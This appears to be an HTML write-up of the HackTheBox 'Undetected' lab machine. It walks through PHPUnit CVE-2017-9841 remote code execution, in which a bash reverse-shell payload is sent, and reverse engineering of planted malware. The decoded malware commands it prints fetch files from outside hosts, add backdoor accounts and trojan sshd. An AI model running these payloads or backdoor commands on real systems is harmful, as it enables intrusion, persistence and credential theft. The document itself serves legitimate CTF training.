@@ -1,0 +1,417 @@
+<html>                             
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>HackTheBox: Undetected</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+Undetected involves a healthy amount of enumeration and forensics both before 
+and after exploitation. Its post-exploitation stages familiarize the user with 
+some moderately difficult reverse engineering. Gaining root access will require
+a good amount of persistence.
+
+MACHINE INFO
+──────────────────────────
+  MACHINE NAME: <a href="https://app.hackthebox.com/machines/Undetected">Undetected</a>
+  IP: 10.10.11.146
+  DIFFICULTY: Medium
+──────────────────────────
+
+An Nmap of the target returns only two ports to look at.
+
+nmap
+─────────────────────────────────────────────────────────────────
+  nmap -sC -sV 10.10.11.146
+  Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-29 22:30 PDT
+  Nmap scan report for 10.10.11.146
+  Host is up (0.11s latency).
+  Not shown: 998 closed ports
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
+  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+  |_http-server-header: Apache/2.4.41 (Ubuntu)
+  |_http-title: Diana's Jewelry
+─────────────────────────────────────────────────────────────────
+
+Opening the website in a browser shows the home page but viewing most of the 
+site will require an entry in /etc/hosts. Adding this can sometimes be worked 
+around by accessing it directly via IP, but not when working with subdomains 
+as this challenge does.
+
+/etc/hosts
+─────────────────────────────────────────────────
+  10.10.11.146    djewelry.htb store.djewelry.htb
+─────────────────────────────────────────────────
+
+Trying to open the cart shows a notice from the site administrator.
+
+http://store.djewelry.htb/cart.php
+───────────────────────────────────────────────────────────────────────────────
+  Notice
+  Due to a website migration, we are currently not taking any online orders. 
+  Contact us if you wish to make a purchase.
+───────────────────────────────────────────────────────────────────────────────
+
+It looks like there's no login system and viewing the page source shows that 
+website is based on PHP, but unfortunately all of the input fields are 
+non-functional as foreshadowed. This means an attack vector will have to be 
+found elsewhere.
+
+Going back to enumerate with a Gobuster scan reveals a couple potentially 
+interesting directories on the website, including /vendor, containing a number 
+of .PHP files.
+
+gobuster
+───────────────────────────────────────────────────────
+  gobuster -u http://store.djewelry.htb -w ./common.txt 
+
+  =====================================================
+  Gobuster v2.0.1              OJ Reeves (@TheColonial)
+  =====================================================
+  [+] Mode         : dir
+  [+] Url/Domain   : http://store.djewelry.htb/
+  [+] Threads      : 10
+  [+] Wordlist     : ./common.txt
+  [+] Status codes : 200,204,301,302,307,403
+  [+] Timeout      : 10s
+  =====================================================
+  2022/06/30 13:57:58 Starting gobuster
+  =====================================================
+  /.hta (Status: 403)
+  /.htaccess (Status: 403)
+  /.htpasswd (Status: 403)
+  /css (Status: 301)
+  /fonts (Status: 301)
+  /images (Status: 301)
+  /index.php (Status: 200)
+  /js (Status: 301)
+  /server-status (Status: 403)
+  /vendor (Status: 301)
+  =====================================================
+  2022/06/30 13:58:52 Finished
+  =====================================================
+───────────────────────────────────────────────────────
+
+Based on the directory list, the server appears to be using <a href="https://getcomposer.org/">Composer</a> to manage 
+its dependencies which provides a list of what is installed at 
+<a href="http://store.djewelry.htb/vendor/composer/installed.json">http://store.djewelry.htb/vendor/composer/installed.json</a>.
+
+http://store.djewelry.htb/vendor/
+─────────────────────────────────────────────────────────────
+  Index of /vendor
+
+  Name   Last modified     Size   Description
+  ───────────────────────────────────────────
+  Parent Directory	 	      
+  autoload.php      2021-07-04 20:40    178 	 
+  bin/	            2022-02-08 19:59    - 	 
+  composer/	    2022-02-08 19:59    - 	 
+  doctrine/	    2022-02-08 19:59    - 	 
+  myclabs/          2022-02-08 19:59    - 	 
+  phpdocumentor/    2022-02-08 19:59    - 	 
+  phpspec/          2022-02-08 19:59    - 	 
+  phpunit/	    2022-02-08 19:59    - 	 
+  sebastian/	    2022-02-08 19:59    - 	 
+  symfony/	    2022-02-08 19:59    - 	 
+  webmozart/	    2022-02-08 19:59    - 	 
+  ───────────────────────────────────────────
+  Apache/2.4.41 (Ubuntu) Server at store.djewelry.htb Port 80
+─────────────────────────────────────────────────────────────
+
+One of these frameworks, PHPUnit, is vulnerable to a Remote Code Execution 
+exploit, CVE-2017-9841, for which there is already a convenient <a href="https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841">POC</a>.
+
+phpunit
+───────────────────────────────
+  name: phpunit/phpunit
+  version: "5.6.2"
+  version_normalized: "5.6.2.0"
+───────────────────────────────
+
+To summarize, this CVE can be exploited by sending a malicious request to
+<a href="http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php">http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</a>, 
+and the server will execute any PHP code in the body of the request.
+
+For this, I’m using Burpsuite however, curl should be sufficient as well.
+
+Start Netcat listener,
+
+netcat
+───────────────────────────
+  nc -nvlp 9000
+  Listening on 0.0.0.0 9000
+───────────────────────────
+
+And send reverse shell code.
+
+burpsuite
+───────────────────────────────────────────────────────────────────────────────
+  GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+  Host: store.djewelry.htb
+  Cache-Control: max-age=0
+  Upgrade-Insecure-Requests: 1
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 
+              (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
+          image/webp,image/apng, 
+	  */*;q=0.8,application/signed-exchange;v=b3;q=0.9
+  Accept-Encoding: gzip, deflate
+  Accept-Language: en-US,en;q=0.9
+  Connection: close
+
+  < ?=exec("/bin/bash -c 'bash -i >& /dev/tcp/{YOUR IP}/9000 0>&1'")? >
+───────────────────────────────────────────────────────────────────────────────
+
+While there are a bunch of great <a href="https://github.com/rebootuser/LinEnum">scripts</a> to automate this process, it can also 
+be great to use the programs that are already installed to check for 
+directories, cron jobs, accounts, software versions, processes, etc.
+
+There are a number of cron jobs on the machine, however the current user 
+doesn't have access to any of the directories they're associated with. But, 
+looking even further, there is a backup folder (/var/backups) on the machine 
+and while it is owned by root, there is an interesting looking file owned by 
+www-data that can be copied to further analyze.
+
+shell
+─────────────────────────────────────────────────────────
+  www-data@production:/var/backups$ ls -la
+  ls -la
+  total 36
+  drwxr-xr-x  2 root     root      4096 Feb  8 19:59 .
+  drwxr-xr-x 13 root     root      4096 Feb  8 19:59 ..
+  -r-x--x--x  1 www-data www-data 27296 May 14  2021 info
+─────────────────────────────────────────────────────────
+
+And this seems to be the right way to go because upon opening the file in 
+<a href="https://rada.re/n/radare2.html">Radare2</a>, there is an interesting string that appears to be obfuscated with 
+hexadecimal and decodes to a shell command. The decoding can be done with 
+CyberChef or a similar tool.
+
+decoded string
+───────────────────────────────────────────────────────────────────────────────
+  wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; 
+  wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 
+  3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && 
+  $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvX
+  oolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999
+  :7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 
+  1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while 
+  read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:
+  $shell" >> /etc/passwd; done < users.txt; rm users.txt;
+───────────────────────────────────────────────────────────────────────────────
+
+That command sets a user password using a hash, which will have to be 
+bruteforced.
+
+───────────────────────────────────────────────────────────────────────────────
+  echo "$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WB
+	M6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/" > hash
+  john --wordlist=SecLists/Passwords/xato-net-10-million-passwords-1000000.txt 
+  ./hash
+  Using default input encoding: UTF-8
+  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+  Cost 1 (iteration count) is 5000 for all loaded hashes
+  Will run 12 OpenMP threads
+  Press 'q' or Ctrl-C to abort, almost any other key for status
+  ihatehackers     (?)
+  1g 0:00:00:28 DONE (2022-07-02 20:28) 0.03460g/s 10310p/s 10310c/s 10310C/s 
+  invasio..houndog1
+  Use the "--show" option to display all of the cracked passwords reliably
+  Session completed
+───────────────────────────────────────────────────────────────────────────────
+
+Now there is a password but no way to tell which user it is for. Reading 
+/etc/passwd shows a number of potential accounts, however there are two in 
+particular associated with /home/steven which are steven and steven1.
+
+And trying the password with both accounts reveals that it’s steven1’s 
+password. With that, it is possible to read the user flag.
+
+shell
+────────────────────────────────────────────────
+  su steven1
+  Password: 
+  steven@production:~$ cat /home/steven/user.txt
+────────────────────────────────────────────────
+
+Now, on to the root flag.
+
+Based on information from previous enumeration, the machine appears to be 
+vulnerable to <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">CVE-2021-4034 (PwnKit)</a> as well as 
+<a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">CVE-2021-3156 (Sudo Baron Sameedit)</a>, both of which could provide a quick 
+and easy privilege escalation route. And, most HackTheBox machines seem to be 
+vulnerable to these at the moment. But that’s boring, and not the intended 
+route.
+
+Instead, some further investigation and reading out Steven’s mail reveals a 
+message from the root user regarding Apache’s functionality.
+
+cat
+───────────────────────────────────────────────────────────────────────────────
+  steven@production:~$ cat /var/mail/steven 
+  From root@production  Sun, 25 Jul 2021 10:31:12 GMT
+  Return-Path: <root@production>
+  Received: from production (localhost [127.0.0.1])
+        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
+        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
+  Received: (from root@localhost)
+        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
+        Sun, 25 Jul 2021 10:31:12 GMT
+  Date: Sun, 25 Jul 2021 10:31:12 GMT
+  Message-Id: <202107251031.80FAcdZ171847@production>
+  To: steven@production
+  From: root@production
+  Subject: Investigations
+
+  Hi Steven.
+
+  We recently updated the system but are still experiencing some strange 
+  behaviour with the Apache service. We have temporarily moved the web store 
+  and database to another server whilst investigations are underway. If for any
+  reason you need access to the database or web application code, get in touch 
+  with Mark and he will generate a temporary password for you to authenticate 
+  to the temporary server.
+
+  Thanks,
+  sysadmin
+───────────────────────────────────────────────────────────────────────────────
+
+In the Apache modules folder (/lib/apache2/modules) which steven seems to have 
+read-write access to, there’s one file that appears to have been modified on 
+May 17, roughly 4 months after the rest of them were installed.
+
+ls
+──────────────────────────────────────────────────────────────
+  steven@production:/lib/apache2/modules$ ls -la
+  ...
+  -rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_ratelimit.so
+  -rw-r--r-- 1 root root   34800 May 17  2021 mod_reader.so
+  -rw-r--r-- 1 root root   14544 Jan  5 14:49 mod_reflector.so
+  ...
+──────────────────────────────────────────────────────────────
+
+Copying it to the local machine and analyzing it the same way reveals another, 
+this time base64-encoded, command.
+
+radare2
+───────────────────────────────────────────────────────────────────────────────
+  [0x00001180]> iz
+  [Strings]
+  nth paddr      vaddr      len size section type  string
+  ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+  ...
+  3   0x00002028 0x00002028 148 149  .rodata ascii d2dldCBzaGFyZWZpbGVzLnh5ei9p
+  bWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL
+  3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
+  ...
+───────────────────────────────────────────────────────────────────────────────
+
+Which decodes to
+
+decoded string
+───────────────────────────────────────────────────────────────────────────────
+  wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r 
+  /usr/sbin/a2enmod` /usr/sbin/sshd
+───────────────────────────────────────────────────────────────────────────────
+
+This command downloads an image off of a server and replaces sshd with it 
+before setting the date of the new sshd to the date a2enmod was last modified, 
+probably because they were installed at the same time. This means that the 
+OpenSSH Daemon was likely modified at some point, which could provide more 
+information.
+
+Again, copying sshd from /usr/sbin/sshd to the local machine and analyzing it 
+in Radare shows an interesting variable in the modified functinon 
+auth_password. Finding this could likely be done faster by taking a diff from 
+an unmodified copy of the same version of sshd.
+
+radare2
+─────────────────────────────────────────────────────────
+  [0x0000ef00]> afl | grep password
+  0x00010650   18 346  -> 339  dbg.auth_password
+  0x0002c500    8 313          dbg.mm_auth_password
+  0x00028c00   13 376  -> 375  dbg.mm_answer_authpassword
+  [0x0000ef00]> s 0x10650
+  [0x00010650]> pdf
+  ...
+  ; var char[31] backdoor @ rbp-0x50
+─────────────────────────────────────────────────────────
+
+The rest of this could also, probably, be done in Radare but it was at this 
+point that I got frustrated and opened this same function in Ghidra for its 
+decompiler, after spending a lot of time trying to reverse this array, and 
+this ended up saving a lot of time.
+
+ghidra
+───────────────────────────────────────
+  backdoor._28_2_ = 0xa9f4;
+  ...
+  backdoor._24_4_ = 0xbcf0b5e3;
+  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+  backdoor[30] = -0x5b;
+  backdoor._0_4_ = 0xf0e7abd6;
+  backdoor._4_4_ = 0xa4b3a3f3;
+  backdoor._8_4_ = 0xf7bbfdc8;
+  backdoor._12_4_ = 0xfdb3d6e7;
+───────────────────────────────────────
+
+Reordering and putting together the array gives another string to analyze with 
+CyberChef.
+
+modified ghidra output
+───────────────────────────────────────────────────────────────────────────────
+  backdoor[30] = -0x5b; (0xa5)
+  # byte ptr [RSP + backdoor[30]],0xa5
+  backdoor._28_2_ = 0xa9f4;
+  backdoor._24_4_ = 0xbcf0b5e3;
+  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+  backdoor._12_4_ = 0xfdb3d6e7;
+  backdoor._8_4_ = 0xf7bbfdc8;
+  backdoor._4_4_ = 0xa4b3a3f3;
+  backdoor._0_4_ = 0xf0e7abd6;
+
+  0xa50xa9f40xbcf0b5e30xb2d6f4a0fda0b3d60xfdb3d6e70xf7bbfdc80xa4b3a3f30xf0e7abd
+  6
+───────────────────────────────────────────────────────────────────────────────
+
+Putting this directly into CyberChef to convert from hexadecimal doesn’t 
+immediately seem to work, first it’s necessary to run it through the swap 
+endianness function as it is a little-endian file, you can read more about that, 
+<a href="https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/">href ("understanding big and little endian byte order)</a>. But this alone does not 
+seem to solve the problem. Going back to Ghidra, the password is also being run 
+through an XOR function.
+
+ghidra
+─────────────────────────────────────────────────────────────────────────────
+  LAB_001106d3                                    XREF[1]:     001106c7(j)  
+          001106d3 83 f2 96        XOR        EDX,0xffffff96
+          001106da 88 50 ff        MOV        byte ptr [RAX + backdoor[0]],DL
+  
+  *pbVar4 = bVar7 ^ 0x96;
+─────────────────────────────────────────────────────────────────────────────
+
+Luckily, the key is not hard to find since it is not obfuscated in any way, and 
+adding this to the CyberChef recipe will output a password for the root user.
+
+cyberchef recipe
+────────────────────────────
+  Swap Endianness - Hex - 31
+  From Hex - Auto
+  XOR - 0x96 - Standard
+────────────────────────────
+
+ssh
+──────────────────────────────────────────────────────
+  ssh 10.10.11.146 -l root   
+  root@10.10.11.146's password: 
+  Last login: Sun Jul  3 16:03:08 2022 from 10.10.14.7
+  root@production:~# cat root.txt
+──────────────────────────────────────────────────────
+
+</pre>
+</body>
+</html>
